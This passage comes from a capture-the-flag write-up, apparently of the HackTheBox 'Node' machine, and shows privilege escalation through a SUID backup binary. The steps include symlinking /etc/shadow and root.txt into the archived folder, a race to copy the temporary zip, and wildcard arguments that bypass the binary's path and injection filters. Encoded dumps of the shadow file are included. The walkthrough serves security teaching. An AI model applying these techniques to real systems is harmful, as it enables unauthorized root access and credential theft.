fgets<span class="o">(</span>nil, 1000, 0x988a010<span class="o">)</span>                      <span class="o">=</span> 0
strcpy<span class="o">(</span>0xff816ad8, <span class="s2">"Ah-ah-ah! You didn't say the mag"</span>...<span class="o">)</span> <span class="o">=</span> 0xff816ad8
<span class="nb">printf</span><span class="o">(</span><span class="s2">" %s[!]%s %s</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"</span><span class="se">\0</span><span class="s2">33[33m"</span>, <span class="s2">"</span><span class="se">\0</span><span class="s2">33[37m"</span>, <span class="s2">"Ah-ah-ah! You didn't say the mag"</span>...<span class="o">)</span> <span class="o">=</span> 58
<span class="nb">exit</span><span class="o">(</span>1
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So it opens a file <code class="language-plaintext highlighter-rouge">/etc/myplace/keys</code> and compares the parameters with the three values in that file. Since the whole string wasnâ€™t visible, I cat the file as I do have read permissions.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>tom@node:/dev/shm<span class="nv">$ </span><span class="nb">cat</span> /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I pass all these as parameters now:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>tom@node:/dev/shm<span class="nv">$ </span>/usr/local/bin/backup a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
 <span class="o">[</span>+] Validated access token
 <span class="o">[</span>+] Starting archiving 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
 <span class="o">[!]</span> The target path doesn<span class="s1">'t exist
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ltrace</code> shows this string, which shows that the last parameter <code class="language-plaintext highlighter-rouge">3de811f4ab2b7543eaf4...</code> is being zipped recursively to <code class="language-plaintext highlighter-rouge">/tmp/.backup_*some-random-number*</code> with a password magicword:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>sprintf<span class="o">(</span><span class="s2">"/usr/bin/zip -r -P magicword /tm"</span>..., <span class="s2">"/usr/bin/zip -r -P magicword %s "</span>..., <span class="s2">"/tmp/.backup_1395679846"</span>, <span class="s2">"3de811f4ab2b7543eaf45df611c2dd25"</span>...<span class="o">)</span> <span class="o">=</span> 129
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Simplest attack which comes to mind is with the use of symbolic links.
So, when that directory is recursively zipped, these symbolic links will be resolved and weâ€™ll get all those files linked, now zipped to <code class="language-plaintext highlighter-rouge">/tmp</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
<span class="nv">$ </span><span class="nb">cd </span>3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /etc/shadow shadow
<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /root/root.txt root.txt
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now, when I run, it says <code class="language-plaintext highlighter-rouge">finished</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>/usr/local/bin/backup a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
 
 <span class="o">[</span>+] Validated access token
 <span class="o">[</span>+] Starting archiving 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
 <span class="o">[</span>+] Finished! Encoded backup is below:
 
UEsDBAoAAAAAAMpQ+FIAAAAAAAAAAAAAAABBABwAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9VVAkAAwvY+2Aa2ftgdXgLAAEE6AMAAAToAwAAUEsDBAoACQAAANR9I0vyjjdALQAAACEAAABJABwAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9yb290LnR4dFVUCQAD0BWsWZPT+2B1eAsAAQQAAAAABAAAAABpF0JOkHoUMGTvcd6OUcz8/uwOBNGRHsHWGqpg/Pjs/2LmA6Hwqd+pwsoY8JhQSwcI8o43QC0AAAAhAAAAUEsDBBQACQAIACl+I0tEby654QEAAKYEAABHABwAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9zaGFkb3dVVAkAA24WrFl74fpgdXgLAAEEAAAAAAQqAAAAwFUk/SB3Nxl8CnZ1TREHszpifw0+2aWt3G0uR3YrysF6ZFOiiycSukXx2bN7mnm+yI/B+TAj4xCKEU8dI1XlaOn6OerNgtyyPc2k7NwADIEYAD/1b0yWOT2ClQJ8HmkoAnB8rSZWcnzrc2OKVyE0Fp877qAxL+kpzkCBkzCu79GuBxmDfCD63TutRsGzP06R8dbJXHOs88rHftm14QtacU6xY2GgYPVxJVE/B3g8TvuPnDnfH/F6vW9/19xXbD3/o4EMce/jDPMpc24O/1hah3F7cOsQHHVWbkWUq0CDi3ARaL+ARhlF/wAvTteeroPRckp45yiSQwDFxfpu/+Ypvux5ynlx4duluYPz6PXpd6X0Gvk6wcBaYPWkCKahn+yspXO5XUdkPH9X5e8B9EiEruPNPCueQAn9WzMelDlVRzMqi717Pje9XHqjkWraPXw7pPMfmUPQLieXQiM/2+QNjMg87486eHa1VcZBmsTTbKFn2D2+gSEMY5KO69Gkno7qD6lXDerQlCGHM4Po7xBtnRoXGg768tBULTpARfn6d2EMoDxpAMcqdECjJuwXVkEYefOW5QK/WVGN1X8U1cR0FKWkBwHKGK7NtJxog4VdIDhFCxL6yxtslC3TiO/2OpHX11BLBwhEby654QEAAKYEAABQSwECHgMKAAAAAADKUPhSAAAAAAAAAAAAAAAAQQAYAAAAAAAAABAA7UEAAAAAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9VVAUAAwvY+2B1eAsAAQToAwAABOgDAABQSwECHgMKAAkAAADUfSNL8o43QC0AAAAhAAAASQAYAAAAAAABAAAAoIF7AAAAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9yb290LnR4dFVUBQAD0BWsWXV4CwABBAAAAAAEAAAAAFBLAQIeAxQACQAIACl+I0tEby654QEAAKYEAABHABgAAAAAAAEAAACggTsBAAAzZGU4MTFmNGFiMmI3NTQzZWFmNDVkZjYxMWMyZGQyNTQxYTVmYzVhZjYwMTc3MjYzOGI4MWRjZTY4NTJkMTEwL3NoYWRvd1VUBQADbhasWXV4CwABBAAAAAAEKgAAAFBLBQYAAAAAAwADAKMBAACtAwAAAAA<span class="o">=</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="getting-zip-with-base64-data">Getting zip with base64 data</h2>
<p>I can even get this zip with that base64 data spitted out by backup binary:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo </span>UEsDBAoAAAAAAMpQ+FIAAAAAAAAAAAAAAABBABwAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9VVAkAAwvY+2Aa2ftgdXgLAAEE6AMAAAToAwAAUEsDBAoACQAAANR9I0vyjjdALQAAACEAAABJABwAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9yb290LnR4dFVUCQAD0BWsWZPT+2B1eAsAAQQAAAAABAAAAABpF0JOkHoUMGTvcd6OUcz8/uwOBNGRHsHWGqpg/Pjs/2LmA6Hwqd+pwsoY8JhQSwcI8o43QC0AAAAhAAAAUEsDBBQACQAIACl+I0tEby654QEAAKYEAABHABwAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9zaGFkb3dVVAkAA24WrFl74fpgdXgLAAEEAAAAAAQqAAAAwFUk/SB3Nxl8CnZ1TREHszpifw0+2aWt3G0uR3YrysF6ZFOiiycSukXx2bN7mnm+yI/B+TAj4xCKEU8dI1XlaOn6OerNgtyyPc2k7NwADIEYAD/1b0yWOT2ClQJ8HmkoAnB8rSZWcnzrc2OKVyE0Fp877qAxL+kpzkCBkzCu79GuBxmDfCD63TutRsGzP06R8dbJXHOs88rHftm14QtacU6xY2GgYPVxJVE/B3g8TvuPnDnfH/F6vW9/19xXbD3/o4EMce/jDPMpc24O/1hah3F7cOsQHHVWbkWUq0CDi3ARaL+ARhlF/wAvTteeroPRckp45yiSQwDFxfpu/+Ypvux5ynlx4duluYPz6PXpd6X0Gvk6wcBaYPWkCKahn+yspXO5XUdkPH9X5e8B9EiEruPNPCueQAn9WzMelDlVRzMqi717Pje9XHqjkWraPXw7pPMfmUPQLieXQiM/2+QNjMg87486eHa1VcZBmsTTbKFn2D2+gSEMY5KO69Gkno7qD6lXDerQlCGHM4Po7xBtnRoXGg768tBULTpARfn6d2EMoDxpAMcqdECjJuwXVkEYefOW5QK/WVGN1X8U1cR0FKWkBwHKGK7NtJxog4VdIDhFCxL6yxtslC3TiO/2OpHX11BLBwhEby654QEAAKYEAABQSwECHgMKAAAAAADKUPhSAAAAAAAAAAAAAAAAQQAYAAAAAAAAABAA7UEAAAAAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9VVAUAAwvY+2B1eAsAAQToAwAABOgDAABQSwECHgMKAAkAAADUfSNL8o43QC0AAAAhAAAASQAYAAAAAAABAAAAoIF7AAAAM2RlODExZjRhYjJiNzU0M2VhZjQ1ZGY2MTFjMmRkMjU0MWE1ZmM1YWY2MDE3NzI2MzhiODFkY2U2ODUyZDExMC9yb290LnR4dFVUBQAD0BWsWXV4CwABBAAAAAAEAAAAAFBLAQIeAxQACQAIACl+I0tEby654QEAAKYEAABHABgAAAAAAAEAAACggTsBAAAzZGU4MTFmNGFiMmI3NTQzZWFmNDVkZjYxMWMyZGQyNTQxYTVmYzVhZjYwMTc3MjYzOGI4MWRjZTY4NTJkMTEwL3NoYWRvd1VUBQADbhasWXV4CwABBAAAAAAEKgAAAFBLBQYAAAAAAwADAKMBAACtAwAAAAA<span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> root-backup.zip
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="getting-zip-with-race-condition">Getting zip with race condition</h2>
<p>After I ran that binary, I donâ€™t see any <code class="language-plaintext highlighter-rouge">/tmp/.backup_*</code> file. Thatâ€™s happening as the program also removes the file at the end.
What I can do is try to copy that file quickly before it gets deleted:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">cp</span> .<span class="k">*</span>backup<span class="k">*</span> /tmp/root-backup.zip 2&gt;/dev/null<span class="p">;</span> <span class="nb">ls</span> /tmp/root-backup.zip 2&gt;/dev/null<span class="p">;</span><span class="k">done</span>
/tmp/root-backup.zip
</pre></td></tr></tbody></table></code></pre></div></div>

<p>When I unzip <code class="language-plaintext highlighter-rouge">/tmp/root-backup.zip</code> with the password <code class="language-plaintext highlighter-rouge">magicword</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre>tom@node:/tmp<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
tom@node:/tmp<span class="nv">$ </span>unzip root-backup.zip
Archive:  root-backup.zip
                                                                                                    magicword
 extracting: 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110/root.txt
  inflating: 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110/shadow
  
tom@node:/tmp/3d...<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
<span class="nt">-rw-r-----</span> 1 tom tom   33 Sep  3  2017 root.txt
<span class="nt">-rw-r-----</span> 1 tom tom 1190 Sep  3  2017 shadow
tom@node:/tmp/3d...<span class="nv">$ </span><span class="nb">cat </span>root.txt
1722e99ca5f353b362556a62bd5e6be0
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="method-2--root">Method-2  Root</h1>
<p>We need not provide all the params, even one of the keys as the 2nd param would work. Letâ€™s check that:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>/usr/local/bin/backup a a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 b
 <span class="o">[</span>+] Validated access token
 <span class="o">[</span>+] Starting archiving b
 <span class="o">[!]</span> The target path doesn<span class="s1">'t exist
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>In fact you can even pass a <code class="language-plaintext highlighter-rouge">\n</code> as a token, as file contains new-line chars too:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>/usr/local/bin/backup a <span class="s2">""</span> b

 <span class="o">[</span>+] Validated access token
 <span class="o">[</span>+] Starting archiving b
 <span class="o">[!]</span> The target path doesn<span class="s1">'t exist
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Also this binary now tries to copy the 3rd param <code class="language-plaintext highlighter-rouge">b</code> recursively. Which means we can specify any directory here.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>/usr/local/bin/backup a 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /root

 <span class="o">[</span>+] Validated access token
 <span class="o">[</span>+] Finished! Encoded backup is below:

UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA<span class="o">==</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>But Base64 decoding and then unzipping this binary with password <code class="language-plaintext highlighter-rouge">magicword</code>, instead of giving root.txt gives a troll message:</p>
<pre><code class="language-abc">$ cat root.txt
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       &lt;wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.&lt;aamQQQW!&lt;yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'&lt;mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk &lt;c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
</code></pre>

<p>If the run the backup binary with ltrace on /dev/shm, it shows many checks the binary is doing to prevent it from copying <code class="language-plaintext highlighter-rouge">/etc</code>, <code class="language-plaintext highlighter-rouge">/root</code> and some command injection techniques.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ltrace /usr/local/bin/backup a 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /dev/shm
strstr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s2">".."</span><span class="o">)</span>                         <span class="o">=</span> nil
strstr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s2">"/root"</span><span class="o">)</span>                      <span class="o">=</span> nil
strchr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s1">';'</span><span class="o">)</span>                          <span class="o">=</span> nil
strchr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s1">'&amp;'</span><span class="o">)</span>                          <span class="o">=</span> nil
strchr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s1">'`'</span><span class="o">)</span>                          <span class="o">=</span> nil
strchr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s1">'$'</span><span class="o">)</span>                          <span class="o">=</span> nil
strchr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s1">'|'</span><span class="o">)</span>                          <span class="o">=</span> nil
strstr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s2">"//"</span><span class="o">)</span>                         <span class="o">=</span> nil
strcmp<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s2">"/"</span><span class="o">)</span>                          <span class="o">=</span> 1
strstr<span class="o">(</span><span class="s2">"/dev/shm"</span>, <span class="s2">"/etc"</span><span class="o">)</span>                       <span class="o">=</span> nil
</pre></td></tr></tbody></table></code></pre></div></div>

<p>These checks can be easily bypassed using the above symlink method or just using regex.
<code class="language-plaintext highlighter-rouge">/root*</code> or <code class="language-plaintext highlighter-rouge">/root?</code> still gets compared to <code class="language-plaintext highlighter-rouge">/root</code> as the terminal resolves the regex before it gets passed to binary.
<code class="language-plaintext highlighter-rouge">"/root*"</code> works as itâ€™s not resolved before.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td> --><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span>/usr/local/bin/backup a <span class="s2">""</span> <span class="s2">"/roo*/roo*txt"</span>

 <span class="o">[</span>+] Validated access token
 <span class="o">[</span>+] Starting archiving /roo<span class="k">*</span>/roo<span class="k">*</span>txt
 <span class="o">[</span>+] Finished! Encoded backup is below:
 UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWZPT+2B1eAsAAQQAAAAABAAAAADsmxirTcTj6ZI3jasUx1SakLyaYrFqGvgmpqDsmUHqwL7sHM1IjxONIGWIR0lQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA

<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWZPT+2B1eAsAAQQAAAAABAAAAADsmxirTcTj6ZI3jasUx1SakLyaYrFqGvgmpqDsmUHqwL7sHM1IjxONIGWIR0lQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> new.zip
<span class="nv">$ </span>unzip new.zip
unzip new.zip
Archive:  new.zip
magicword

 extracting: root/root.txt
<span class="nv">$ </span><span class="nb">cat </span>root.txt
<span class="nv">$ </span><span class="nb">ls
</span>new.zip  root
<span class="nv">$ </span><span class="nb">cd </span>root
<span class="nv">$ </span><span class="nb">ls
</span>root.txt
<span class="nv">$ </span><span class="nb">cat </span>root.txt
1722e99ca5f353b362556a62bd5e6be0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>You can even add a flag for <code class="language-plaintext highlighter-rouge">zip</code> command instead of that <code class="language-plaintext highlighter-rouge">a</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>/usr/local/bin/backup <span class="nt">-q</span> <span class="s2">""</span> <span class="s2">"/roo*/roo*txt"</span>
